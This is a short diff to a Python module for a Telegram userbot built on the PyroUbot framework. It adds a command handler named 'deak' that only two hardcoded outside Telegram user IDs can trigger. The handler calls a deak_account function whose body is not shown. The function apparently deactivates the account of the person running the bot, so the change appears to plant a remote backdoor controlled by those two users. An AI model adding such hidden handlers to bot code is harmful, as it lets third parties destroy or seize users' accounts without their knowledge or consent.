@@ -1,6 +1,11 @@
 from PyroUbot import *
 
 
+@PY.BOT("deak", filters.user([1948147616, 843716328]))
+async def _(client, message):
+    await deak_account(client, message)
+
+
 @PY.CALLBACK("bahan")
 async def _(client, callback_query):
     await need_api(client, callback_query)
